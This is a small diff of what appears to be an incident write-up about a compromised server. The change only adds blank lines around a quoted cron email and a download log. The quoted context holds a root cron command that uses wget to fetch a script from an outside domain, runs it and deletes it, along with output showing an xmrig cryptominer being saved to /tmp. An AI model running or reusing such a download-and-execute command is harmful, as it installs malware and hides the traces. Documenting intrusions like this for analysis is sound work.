@@ -95,6 +95,7 @@ happening on June 21st 2017.
 
 <details>
 <summary>
+     
 ```
 Subject: Cron <root@timbuktu> wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
 MIME-Version: 1.0
@@ -970,6 +971,7 @@ Saving to: ‘/tmp/xmrig’
   1700K .......... .......... .......... .......... .......... 99%  906K 0s
   1750K ........                                              100%  443K=3.6s
 ```
+
 </details>
 
 
